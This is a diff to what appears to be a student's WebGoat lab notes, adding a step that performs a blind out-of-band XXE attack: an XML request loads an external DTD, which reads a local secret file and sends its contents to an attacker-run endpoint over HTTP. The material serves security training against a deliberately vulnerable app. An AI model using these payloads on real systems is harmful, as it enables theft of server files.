@@ -147,6 +147,29 @@ Content-Type: application/xml;
 ]><comment>  <text>&xxe;</text></comment>
 ```
 
+### 11
+
+Peticion 
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+	<!ENTITY % xxe SYSTEM "http://10.0.2.15:9090/files/adrianeguez/attack3.dtd">
+	%xxe;
+]>
+<comment>  <text>no need to inject here</text></comment>
+```
+attack.dtd
+```xml
+<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.1.0/XXE/secret.txt">
+<!ENTITY % bar "<!ENTITY &#x25; out SYSTEM 'http://10.0.2.15:9090/landing/xxe?content=%file;'>">
+%bar;
+%out;
+```
+
+
+
+
 ## JWT Tokens
 
 
